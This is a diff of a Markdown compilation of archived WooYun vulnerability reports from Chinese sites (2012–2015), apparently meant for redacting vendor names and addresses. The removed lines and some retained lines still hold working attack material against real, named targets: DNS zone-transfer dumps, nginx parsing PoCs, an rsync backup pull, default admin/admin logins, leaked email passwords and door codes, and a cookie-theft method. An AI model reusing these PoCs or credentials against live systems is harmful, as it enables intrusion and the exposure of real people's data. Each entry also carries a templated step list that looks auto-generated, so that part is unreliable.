+**修复**: 参照 MongoDB安全配置 https://example.com/[已脱敏]
 ---
 
 ---
@@ -23240,7 +23240,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这台的未正确设置ns1.ufsoft.com.cnTrying Zone Transfer for yonyou.com on ns1.ufsoft.com.cn ...yonyou.com                               3600     IN    SOAyonyou.com                               3600     IN    A        125.35.5.132yonyou.com                               3600     IN    NSyonyou.com                               3600     IN    NSyonyou.com                               3600     IN    NSyonyo
+**详情**: 这台的未正确设置ns1.ufsoft.com.cnTrying Zone Transfer for yonyou.com on ns1.ufsoft.com.cn ...yonyou.com                               3600     IN    SOAyonyou.com                               3600     IN    A        [IP已脱敏]yonyou.com                               3600     IN    NSyonyou.com                               3600     IN    NSyonyou.com                               3600     IN    NSyonyo
 
 **POC**: (见原文)
 
@@ -23250,8 +23250,8 @@
 ---
 
 ---
-### [wooyun-2012-08070] 百度某站遍历目录漏洞
-**厂商**: 百度 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-08070] 某搜索引擎某站遍历目录漏洞
+**厂商**: 某搜索引擎 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -23262,7 +23262,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://its.map.baidu.com:8002/traffic/http://its.map.baidu.com:8002/managetomcat web server administration tool:http://its.map.baidu.com:8002/admin
+**详情**: https://example.com/[已脱敏] web server administration tool:https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -23284,7 +23284,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 哗啦啦北京格致璞科技旗下知名站点DNS域传送漏洞：C:\Users\Administrator>nslookup默认服务器:  google-public-dns-a.google.comAddress:  8.8.8.8> set type=ns> hualala.com服务器:  google-public-dns-a.google.comAddress:  8.8.8.8非权威应答:hualala.com     nameserver = sns.gozap.comhualala.com     nameserver = ns.gozap.com> server sns.gozap.com默认服务器:  sns.gozap.comAddress:  58.68.151.18> ls hualala.com[sns.gozap.com]hualala.com.             
+**详情**: 哗啦啦北京格致璞科技旗下知名站点DNS域传送漏洞：C:\Users\Administrator>nslookup默认服务器:  google-public-dns-a.google.comAddress:  [IP已脱敏]> set type=ns> hualala.com服务器:  google-public-dns-a.google.comAddress:  [IP已脱敏]非权威应答:hualala.com     nameserver = sns.gozap.comhualala.com     nameserver = ns.gozap.com> server sns.gozap.com默认服务器:  sns.gozap.comAddress:  [IP已脱敏]> ls hualala.com[sns.gozap.com]hualala.com.             
 
 **POC**: 如上
 
@@ -23294,8 +23294,8 @@
 ---
 
 ---
-### [wooyun-2014-086600] 京东jae绕过虚拟机读取系统任意文件
-**厂商**: 京东商城 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
+### [wooyun-2014-086600] 某电商平台jae绕过虚拟机读取系统任意文件
+**厂商**: 某电商平台商城 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 上传功能
 
@@ -23306,7 +23306,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 京东jae虽然个人用户的执行环境是虚拟机，但是在git上传代码是会把创建的link带入，从而在同步到虚拟环境时读取文件
+**详情**: 某电商平台jae虽然个人用户的执行环境是虚拟机，但是在git上传代码是会把创建的link带入，从而在同步到虚拟环境时读取文件
 
 **POC**: 这个是宿主机的passwd宿主机的hosts，里面有很多内网的域名127.0.0.1	localhost127.0.1.1	ubuntu# The following lines are desirable for IPv6 capable hosts::1     ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allrouters***.***.137.245 api.jd-app.com***.***.131.57 	code.jd.c
 
@@ -23328,18 +23328,18 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 目标网站：http://www.101.com.tw/为购物商城。; <<>> DiG 9.8.4-rpz2+rl005.12-P1 <<>> @ns1.addcn.com.tw. axfr 101.com.tw; (1 server found);; global options: +cmd101.com.tw.		90	IN	SOA	ns2.addcn.com.tw. ronman.8591.com.tw. 2014073101 10800 3600 604800 86400101.com.tw.		90	IN	NS	ns1.518.com.tw.101.com.tw.		90	IN	NS	ns1.addcn.com.tw.101.com.tw.		90	IN	NS	ns2.addcn.com.tw.101.com.tw.		90	IN	NS	ns3.addcn.com.tw.101.
+**详情**: 目标网站：https://example.com/[已脱敏] <<>> DiG 9.8.4-rpz2+rl005.12-P1 <<>> @ns1.addcn.com.tw. axfr 101.com.tw; (1 server found);; global options: +cmd101.com.tw.		90	IN	SOA	ns2.addcn.com.tw. ronman.8591.com.tw. 2014073101 10800 3600 604800 86400101.com.tw.		90	IN	NS	ns1.518.com.tw.101.com.tw.		90	IN	NS	ns1.addcn.com.tw.101.com.tw.		90	IN	NS	ns2.addcn.com.tw.101.com.tw.		90	IN	NS	ns3.addcn.com.tw.101.
 
 **POC**: ; <<>> DiG 9.8.4-rpz2+rl005.12-P1 <<>> @ns1.addcn.com.tw. axfr 101.com.tw; (1 server found);; global options: +cmd101.com.tw.		90	IN	SOA	ns2.addcn.com.tw. ronman.8591.com.tw. 2014073101 10800 3600 604800 86400101.com.tw.		90	IN	NS	ns1.518.com.tw.101.com.tw.		90	IN	NS	ns1.addcn.com.tw.101.com.tw.		90
 
 **绕过**: 直接利用
 
-**修复**: 修复请参考http://www.myhack58.com/Article/html/3/62/2013/38149_2.htm
+**修复**: 修复请参考https://example.com/[已脱敏]
 ---
 
 ---
 ### [wooyun-2015-0108045] 一条命令搞定你的邮箱大师（一定条件下可获取数据）
-**厂商**: 网易 | **年份**: 2015 | **类型**: 默认配置不当
+**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 默认配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -23394,7 +23394,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 微信关注“e牧宝”绑定手机号，绑定时存在短信重复发送漏洞点击牧场买羊》牧场主》收货地址 获得如下链接修改ID即可 获取其他用户的地址http://**.**.**.**/Address/AddAddress?ReturnPage=http://**.**.**.**/Address/AddressList&AddressId=259点击银行卡，获得以下链接修改ID即可 获取其他用户的地址http://**.**.**.**/Bank/AddBank?ReturnPage=http://**.**.**.**/Bank/BankList&BankId=283
+**详情**: 某互联网公司关注“e牧宝”绑定手机号，绑定时存在短信重复发送漏洞点击牧场买羊》牧场主》收货地址 获得如下链接修改ID即可 获取其他用户的地址http://**.**.**.**/Address/AddAddress?ReturnPage=http://**.**.**.**/Address/AddressList&AddressId=259点击银行卡，获得以下链接修改ID即可 获取其他用户的地址http://**.**.**.**/Bank/AddBank?ReturnPage=http://**.**.**.**/Bank/BankList&BankId=283
 
 **POC**: (见原文)
 
@@ -23416,9 +23416,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: inurl:WebServlet?go=Str=打开后，可以发现，用户注册的资料一目了然http://www.bankofshanghai.com/WebServlet?go=shbank_corporateaccount_pg_DepositorInfoDetail&depositorIdStr=Vy1OQh5ea5s=xdW9Q6Do2oU=&competentOrganizationIdStr=Vy1OQh5ea5s=JHyaOoVTyZk=&competentOrganization.remark=printhttp://www.bankofshanghai.com/WebServlet?go=shbank_corporateaccount_pg_DepositorInfoDetail&depositorIdStr=Vy1OQh5ea5s=xdW9Q6Do2oU=&competen
+**详情**: inurl:WebServlet?go=Str=打开后，可以发现，用户注册的资料一目了然https://example.com/[已脱敏]
 
-**POC**: http://www.bankofshanghai.com/WebServlet?go=shbank_corporateaccount_pg_DepositorInfoDetail&depositorIdStr=Vy1OQh5ea5s=xdW9Q6Do2oU=&competentOrganizationIdStr=Vy1OQh5ea5s=JHyaOoVTyZk=&competentOrganization.remark=printhttp://www.bankofshanghai.com/WebServlet?go=shbank_corporateaccount_pg_DepositorInf
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -23438,7 +23438,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: https://218.29.130.242/看到这个系统之后第一个想法就是没有验证码，那就好 暴力破解，结果跑了半天什么都没跑出来然后试了下heartbleed发现存在心脏出血漏洞，而且可以明文抓取到用户名和密码。若用户利用正确的用户名密码进行登录，那我就可以进去系统了，但是没耐心等，就先报上来吧
+**详情**: https://[IP已脱敏] 暴力破解，结果跑了半天什么都没跑出来然后试了下heartbleed发现存在心脏出血漏洞，而且可以明文抓取到用户名和密码。若用户利用正确的用户名密码进行登录，那我就可以进去系统了，但是没耐心等，就先报上来吧
 
 **POC**: (见原文)
 
@@ -23460,7 +23460,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: https://api.kaixin001.com/oauth2/authorize?client_id=28204214253735367b372d8ced8ef6a5&redirect_uri=http%3A%2F%2Fdiaoyu.org\.passport.kuxun.cn%2Fopenid%2Flogin_kaixin_back&response_type=code&state=4b207c0b266cfcb3ad22058b1aa9b78e&scope=create_records不用我多说了把利用方式：在页面嵌入iframe，该连接，然后获取信息或者调用api都可以
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 自己试下就知道了
 
@@ -23504,9 +23504,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: info:聚胜万合信息技术（上海）有限公司:http://www.mediav.com/漏洞点：泄露信息：
+**详情**: info:聚胜万合信息技术（上海）有限公司:https://example.com/[已脱敏]
 
-**POC**: img src="https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/201508/24235435f33310e073edaf0a359b30e17bc40159.jpg" alt="fenxi-svn2.jpg" /><
+**POC**: img src="https://example.com/[已脱敏]" alt="fenxi-svn2.jpg" /><
 
 **绕过**: 直接利用
 
@@ -23526,7 +23526,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 源码位于:http://115.182.3.191/admin.tar.gzhttp://115.182.3.194/code.tar.gz
+**详情**: 源码位于:http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -23548,9 +23548,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 存在于以下两站：http://www.ijie.com/http://pt2013.ijie.com/传说中的为所欲为的漏洞WooYun: PHPCMS V9 一个为所欲为的漏洞
+**详情**: 存在于以下两站：https://example.com/[已脱敏] PHPCMS V9 一个为所欲为的漏洞
 
-**POC**: http://www.ijie.com//phpsso_server/index.php?m=phpsso&c=index&a=getapplist&auth_data=v=1&appid=1&data=e5c2VAMGUQZRAQkIUQQKVwFUAgICVgAIAldVBQFDDQVcV0MUQGkAQxVZZlMEGA9+DjZoK1AHRmUwBGcOXW5UDgQhJDxaeQVnGAdxVRcKQ
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -23558,8 +23558,8 @@
 ---
 
 ---
-### [wooyun-2014-051297] 中国移动河南分公司政企客户中心拿下服务器
-**厂商**: 中国移动 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
+### [wooyun-2014-051297] 某运营商河南分公司政企客户中心拿下服务器
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 上传功能
 
@@ -23614,9 +23614,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://218.207.206.161:80/	Microsoft-IIS/6.0存在iis可写漏洞三明市气象局
+**详情**: http://[IP已脱敏]	Microsoft-IIS/6.0存在iis可写漏洞三明市气象局
 
-**POC**: http://218.207.206.161/20141111091150.asp;.txt密码z
+**POC**: http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -23658,7 +23658,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: # NGINX 配置不当，任意文件当做php执行。http://bbs.hupu.com/robots.txt/a.phphttp://my.hupu.com/robots.txt/a.phphttp://youxi.hupu.com/static/gameIndex/js/common.js/a.php
+**详情**: # NGINX 配置不当，任意文件当做php执行。https://example.com/[已脱敏]
 
 **POC**: # 服务端解释php扩展
 
@@ -23690,8 +23690,8 @@
 ---
 
 ---
-### [wooyun-2012-06580] 腾讯301跳转一枚，可钓鱼
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-06580] 某互联网公司301跳转一枚，可钓鱼
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -23702,7 +23702,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 腾讯301跳转一枚，可钓鱼
+**详情**: 某互联网公司301跳转一枚，可钓鱼
 
 **POC**: 访问：campus.tencent.com/.cdbjj.com会被连续跳转到wooyun原因是campus.tencent.com的301重定向把“/”过滤掉了造成的重定向，很容易被利用
 
@@ -23712,8 +23712,8 @@
 ---
 
 ---
-### [wooyun-2015-096608] 携程某服务器配置不当
-**厂商**: 携程旅行网 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
+### [wooyun-2015-096608] 某旅游平台某服务器配置不当
+**厂商**: 某旅游平台旅行网 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -23768,9 +23768,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: bilibili使用的企业邮箱后缀为@bilibili.com查询主域名记录如下可看到MX记录表明使用腾讯企业邮箱服务收信但并没有设置用于反垃圾邮件的TXT记录使得接收邮件的邮件服务器不会将伪造的邮件移入垃圾邮件箱
+**详情**: bilibili使用的企业邮箱后缀为@bilibili.com查询主域名记录如下可看到MX记录表明使用某互联网公司企业邮箱服务收信但并没有设置用于反垃圾邮件的TXT记录使得接收邮件的邮件服务器不会将伪造的邮件移入垃圾邮件箱
 
-**POC**: 成功接收，并没有进垃圾邮件箱，同时由于其使用了腾讯的企业邮箱服务，所以甚至还有腾讯企业邮箱认证标志
+**POC**: 成功接收，并没有进垃圾邮件箱，同时由于其使用了某互联网公司的企业邮箱服务，所以甚至还有某互联网公司企业邮箱认证标志
 
 **绕过**: 直接利用
 
@@ -23792,7 +23792,7 @@
 
 **详情**: 下载源码之后，搭建完该cms之后。发现install.php文件还在。error_reporting(0);header("Content-Type: text/html; charset=utf-8");$site_url = "http://".$_SERVER["HTTP_HOST"].$_SERVER['PHP_SELF'];$site_url = preg_replace("/\/[a-z0-9]+\.php.*/is", "", $site_url);if($_POST['db_host'] && $_POST['db_name'] && $_POST['db_user'] && $_POST['db_prefix']) {$file = "Application/Common/Conf/db.php";$data = "<?phpreturn array('DB_TYPE' 
 
-**POC**: 五个互联网实例http://www.dxsfood.com/install.phphttp://www.meiguo.com.cn/install.phphttp://freshfoodday.com/install.phphttp://www.hanguo2.com/install.phphttp://www.sushe.wang/install.php
+**POC**: 五个互联网实例https://example.com/[已脱敏]
 
 **绕过**: 编码绕过
 
@@ -23812,7 +23812,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.xiami.com/admin/show/login
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -23844,8 +23844,8 @@
 ---
 
 ---
-### [wooyun-2014-049877] 安全配置缺失导致链路窃听可窃取支付宝Cookie
-**厂商**: 支付宝 | **年份**: 2014 | **类型**: 应用配置错误
+### [wooyun-2014-049877] 安全配置缺失导致链路窃听可窃取某电商平台Cookie
+**厂商**: 某电商平台 | **年份**: 2014 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -23856,13 +23856,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 如果用户使用网页版支付宝的链路存在窃听，可以结合ARP欺骗攻击或者简单的社工在浏览器不伪造https证书错误的情况下获取支付宝Cookie。
+**详情**: 如果用户使用网页版某电商平台的链路存在窃听，可以结合ARP欺骗攻击或者简单的社工在浏览器不伪造https证书错误的情况下获取某电商平台Cookie。
 
-**POC**: 此处存在302跳转服务器返回302，说明用户Cookie信息已经被使用HTTP明文发送到服务器。利用方法：攻击者可以结合ARP欺骗或者简单的社工，让用户访问http://www.alipay.com（非https） 来将已登陆用户的Cookie通过http方式发送出来，这个时候只要进行链路上的窃听即可窃听到用户的Cookiehttps://my.alipay.com 不存在该问题，故判定这个问题可能是应用配置错误，而非支付宝没有注意这个问题。另：此问题不仅影响支付宝，许多国内的支付平台没有注意到这个问题的严重性，也就是有许多支付账号存在被攻击的一个重要方面。[希望楼下大牛不要欺负我哦~~ 亲~
+**POC**: 此处存在302跳转服务器返回302，说明用户Cookie信息已经被使用HTTP明文发送到服务器。利用方法：攻击者可以结合ARP欺骗或者简单的社工，让用户访问https://example.com/[已脱敏] 来将已登陆用户的Cookie通过http方式发送出来，这个时候只要进行链路上的窃听即可窃听到用户的Cookiehttps://example.com/[已脱敏] 不存在该问题，故判定这个问题可能是应用配置错误，而非某电商平台没有注意这个问题。另：此问题不仅影响某电商平台，许多国内的支付平台没有注意到这个问题的严重性，也就是有许多支付账号存在被攻击的一个重要方面。[希望楼下大牛不要欺负我哦~~ 亲~
 
 **绕过**: 直接利用
 
-**修复**: 我想支付宝对于这个问题只是个配置问题，肯定很明白这个问题如何修复。paypal首页就已经向客户端浏览器发送了Strict-Transport-Security: max-age=16070400; includeSubDomains，建议支付宝也加入包含所有域名这个选项。参考文档：http://de
+**修复**: 我想某电商平台对于这个问题只是个配置问题，肯定很明白这个问题如何修复。paypal首页就已经向客户端浏览器发送了Strict-Transport-Security: max-age=16070400; includeSubDomains，建议某电商平台也加入包含所有域名这个选项。参考文档：http://de
 ---
 
 ---
@@ -23900,9 +23900,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.地址：http://www.aircamel.com.tw/2.首页：3.外泄域名指向：; <<>> DiG 9.8.3-P1 <<>> @ns2.aircamel.com.tw. axfr aircamel.com.tw; (1 server found);; global options: +cmdaircamel.com.tw.	2592000	IN	SOA	ns.aircamel.com.tw. root.aircamel.com.tw. 2014010901 38400 10800 604800 38400aircamel.com.tw.	2592000	IN	NS	ns.aircamel.com.tw.aircamel.com.tw.	2592000	IN	NS	ns2.aircamel.com.tw.aircamel.com.tw.	2592000	IN	A	61.31.
+**详情**: 1.地址：https://example.com/[已脱敏] <<>> DiG 9.8.3-P1 <<>> @ns2.aircamel.com.tw. axfr aircamel.com.tw; (1 server found);; global options: +cmdaircamel.com.tw.	2592000	IN	SOA	ns.aircamel.com.tw. root.aircamel.com.tw. 2014010901 38400 10800 604800 38400aircamel.com.tw.	2592000	IN	NS	ns.aircamel.com.tw.aircamel.com.tw.	2592000	IN	NS	ns2.aircamel.com.tw.aircamel.com.tw.	2592000	IN	A	61.31.
 
-**POC**: 1.地址：http://www.aircamel.com.tw/2.首页：3.外泄域名指向：; <<>> DiG 9.8.3-P1 <<>> @ns2.aircamel.com.tw. axfr aircamel.com.tw; (1 server found);; global options: +cmdaircamel.com.tw.	2592000	IN	SOA	ns.aircamel.com.tw. root.aircamel.com.tw. 2014010901 38400 10800 604800 38400aircamel.com.tw.	2592000	IN	NS	ns.air
+**POC**: 1.地址：https://example.com/[已脱敏] <<>> DiG 9.8.3-P1 <<>> @ns2.aircamel.com.tw. axfr aircamel.com.tw; (1 server found);; global options: +cmdaircamel.com.tw.	2592000	IN	SOA	ns.aircamel.com.tw. root.aircamel.com.tw. 2014010901 38400 10800 604800 38400aircamel.com.tw.	2592000	IN	NS	ns.air
 
 **绕过**: 直接利用
 
@@ -23922,7 +23922,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 国家地震科学数据共享中心http://202.96.24.12/
+**详情**: 国家地震科学数据共享中心http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -23946,7 +23946,7 @@
 
 **详情**: 看的我都蛋疼了。。所有服务器 nginx解析
 
-**POC**: http://www.xilu.com/applacation/xiluvt/submit/user/images/tp_btn2.jpg/1.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -23966,7 +23966,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://softdl.pcdoctor.kingsoft.com/version/kav_setup.exe/.phpWarning: Unexpected character in input: '' (ASCII=19) state=1 in /data/appdatas/ksafedata/softdl.pcdoctor.kingsoft.com/version/kav_setup.exe on line 647Parse error: syntax error, unexpected T_STRING in /data/appdatas/ksafedata/softdl.pcdoctor.kingsoft.com/version/kav_setup.exe on line 647剩下的地方自己检查吧～
+**详情**: https://example.com/[已脱敏] Unexpected character in input: '' (ASCII=19) state=1 in /data/appdatas/ksafedata/softdl.pcdoctor.kingsoft.com/version/kav_setup.exe on line 647Parse error: syntax error, unexpected T_STRING in /data/appdatas/ksafedata/softdl.pcdoctor.kingsoft.com/version/kav_setup.exe on line 647剩下的地方自己检查吧～
 
 **POC**: (见原文)
 
@@ -23988,7 +23988,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 雷锋网DNS域传送漏洞一枚DNS域传送漏洞  leiphone.com上图：> leiphone.com服务器:  google-public-dns-a.google.comAddress:  8.8.8.8非权威应答:leiphone.com    nameserver = ns2.leiphone.comleiphone.com    nameserver = ns3.leiphone.com> set type=ns> leiphone.com服务器:  tfs.gotogether.orgAddress:  192.168.2.253非权威应答:leiphone.com    nameserver = ns3.leiphone.comleiphone.com    nameserver = ns2.leiphone.comns3.leiphone.com        inter
+**详情**: 雷锋网DNS域传送漏洞一枚DNS域传送漏洞  leiphone.com上图：> leiphone.com服务器:  google-public-dns-a.google.comAddress:  [IP已脱敏]非权威应答:leiphone.com    nameserver = ns2.leiphone.comleiphone.com    nameserver = ns3.leiphone.com> set type=ns> leiphone.com服务器:  tfs.gotogether.orgAddress:  [IP已脱敏]非权威应答:leiphone.com    nameserver = ns3.leiphone.comleiphone.com    nameserver = ns2.leiphone.comns3.leiphone.com        inter
 
 **POC**: (见原文)
 
@@ -24032,7 +24032,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 宜宾翠屏区红盾信息网宜宾市翠屏区工商行政管理局http://www.yb315.com.cn/test.txt
+**详情**: 宜宾翠屏区红盾信息网宜宾市翠屏区工商行政管理局https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -24054,7 +24054,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 通过查看mysql配置文件，获取mysql连接配置文件，查看发现也存在mysql数据库默认通用口令问题演示123.232.0.246220.197.212.460.19.64.162113.59.116.228218.204.36.51www.landandan.com
+**详情**: 通过查看mysql配置文件，获取mysql连接配置文件，查看发现也存在mysql数据库默认通用口令问题演示123.232.0.246220.[IP已脱敏].64.162113.59.116.228218.204.36.51www.landandan.com
 
 **POC**: SSH进入设备cat /opt/kdm/pms/conf/pmscfg.ini连接之可以查看两个与业务相关数据库KDM3ADB和uas下面通过mysql上传webshell进行演示查看php文件默认路径find / -name "*.php"/opt/kdm/uls/apache/htdocs/好 我们需要导出到这里导出错误Can't create/write to file '/opt/kdm/uls/apache/htdocs/wooyun.php' (Errcode: 13)因为mysql权限问题，没有写到opt目录的权限，所以在不提权情况下无法上传webshell到此为止，如有大牛能够
 
@@ -24098,7 +24098,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 115.182.6.40:81115.182.6.41:83115.182.6.41:85115.182.6.41:84这几个ip都存在admin目录 用户名密码 admin/admin 可以直接登录看呐 这都是些什么为了验证 我就手机下载了一个佣兵传奇  注册了一个用户叫auzer
+**详情**: [IP已脱敏].182.6.41:83115.182.6.41:85115.182.6.41:84这几个ip都存在admin目录 用户名密码 admin/admin 可以直接登录看呐 这都是些什么为了验证 我就手机下载了一个佣兵传奇  注册了一个用户叫auzer
 
 **POC**: 来 我们到后台看看全都对上了 点点鼠标就可以体验土豪的感觉了呢
 
@@ -24120,7 +24120,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 汕头市国土资源网上交易系统http://125.91.6.66/
+**详情**: 汕头市国土资源网上交易系统http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -24142,7 +24142,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.91wan.com/info/xinwen/2011-07/48637.html/x.php
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -24164,7 +24164,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://180.186.35.95/Login.aspx呵呵，还是aspx的..
+**详情**: http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -24186,9 +24186,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: LDAP匿名访问:59.151.111.93:389
+**详情**: LDAP匿名访问:[IP已脱敏]
 
-**POC**: 我看到有些公司的邮件系统直接用LDAP明文存储邮箱密码的,结果从高管到员工的邮箱可能全部被控制.发现真是进入企业内部的好通道啊!总有几个员工弱口令的:https://mail.oupeng.comkongcongcong@oupeng.comkongcongcongrenyongy@oupeng.comrenyongywifi:Hubei446Beijing7Guangdong3Guangxi0Xinjiang0Fujian42看出每月密码更换规则没?公司每个小房间门禁密码:房间号	密码926	110926*927	110927*928	110928*929	110929#937	110937
+**POC**: 我看到有些公司的邮件系统直接用LDAP明文存储邮箱密码的,结果从高管到员工的邮箱可能全部被控制.发现真是进入企业内部的好通道啊!总有几个员工弱口令的:https://example.com/[已脱敏]	密码926	110926*927	110927*928	110928*929	110929#937	110937
 
 **绕过**: 直接利用
 
@@ -24252,9 +24252,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 搜狐一订单支付系统泄漏！http://cart.sohu.net/
+**详情**: 搜狐一订单支付系统泄漏！https://example.com/[已脱敏]
 
-**POC**: http://cart.sohu.net/
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -24298,7 +24298,7 @@
 
 **详情**: 
 
-**POC**: root@bogon:~# rsync -av root@125.62.63.127::backupreceiving incremental file listdrwxr-xr-x     1048576 2014/07/11 20:02:02 .-rw-r--r--           0 2014/01/07 16:25:53 140107-162552.dcg.nodata-rw-r--r--     4010084 2014/03/01 15:53:42 140301-155340.dcg-rw-r--r--     4009674 2014/03/01 15:58:15 14030
+**POC**: root@bogon:~# rsync -av root@[IP已脱敏]::backupreceiving incremental file listdrwxr-xr-x     1048576 2014/07/11 20:02:02 .-rw-r--r--           0 2014/01/07 16:25:53 140107-162552.dcg.nodata-rw-r--r--     4010084 2014/03/01 15:53:42 140301-155340.dcg-rw-r--r--     4009674 2014/03/01 15:58:15 14030
 
 **绕过**: 直接利用
 
@@ -24328,8 +24328,8 @@
 ---
 
 ---
-### [wooyun-2012-07084] 中国电信某GPS监控平台存在严重问题！
-**厂商**: 中国电信 | **年份**: 2012 | **类型**: 应用配置错误
+### [wooyun-2012-07084] 某运营商某GPS监控平台存在严重问题！
+**厂商**: 某运营商 | **年份**: 2012 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 后台管理
 
@@ -24340,7 +24340,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 第一次接触这个高科技东西，哈哈。。看到国字开头的运营商就头大（监控后台显示的中国电信）GPS监控系统平台。在应用上我就不多说了，因为这个还是有一定权限的。在应用上来讲的话，我大致看了下（一眼就能记住，当然也能马上忘记不该看的东西）以下四点基本貌似都存在相应的，至少在公检法倒是有不少的。我就不吐槽了，因为在乌云第一次发这样的东西，刚接触2天工控上的，感觉特恐怖，因为不能像平时一样进行测试，也罢，顺带普及下知识，具体看详细说明及配图吧。(1)运输车队遥控指挥系统以车辆监控系统为核心，组成货物运输车队的遥控指挥系统，中心站根据每辆车的实时位置与货物的起讫点对车辆的行驶路径进行综合规划，从而提高车辆利用率，降低成本，最大限度地减少在路上的时间，提高道路利用率；(2)最佳运行路线的调整以车辆监控系统为核心，进行适当地改造，实时地半道路堵塞情况通知给移动车辆，使系统内的用户能够及时调整最佳运行路线，为
+**详情**: 第一次接触这个高科技东西，哈哈。。看到国字开头的运营商就头大（监控后台显示的某运营商）GPS监控系统平台。在应用上我就不多说了，因为这个还是有一定权限的。在应用上来讲的话，我大致看了下（一眼就能记住，当然也能马上忘记不该看的东西）以下四点基本貌似都存在相应的，至少在公检法倒是有不少的。我就不吐槽了，因为在乌云第一次发这样的东西，刚接触2天工控上的，感觉特恐怖，因为不能像平时一样进行测试，也罢，顺带普及下知识，具体看详细说明及配图吧。(1)运输车队遥控指挥系统以车辆监控系统为核心，组成货物运输车队的遥控指挥系统，中心站根据每辆车的实时位置与货物的起讫点对车辆的行驶路径进行综合规划，从而提高车辆利用率，降低成本，最大限度地减少在路上的时间，提高道路利用率；(2)最佳运行路线的调整以车辆监控系统为核心，进行适当地改造，实时地半道路堵塞情况通知给移动车辆，使系统内的用户能够及时调整最佳运行路线，为
 
 **POC**: (见原文)
 
@@ -24350,8 +24350,8 @@
 ---
 
 ---
-### [wooyun-2012-011031] 各大站点后台泄露。腾讯百度新浪搜狐联通移动
-**厂商**: 新浪 | **年份**: 2012 | **类型**: 应用配置错误
+### [wooyun-2012-011031] 各大站点后台泄露。某互联网公司某搜索引擎某社交平台搜狐联通移动
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -24362,9 +24362,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
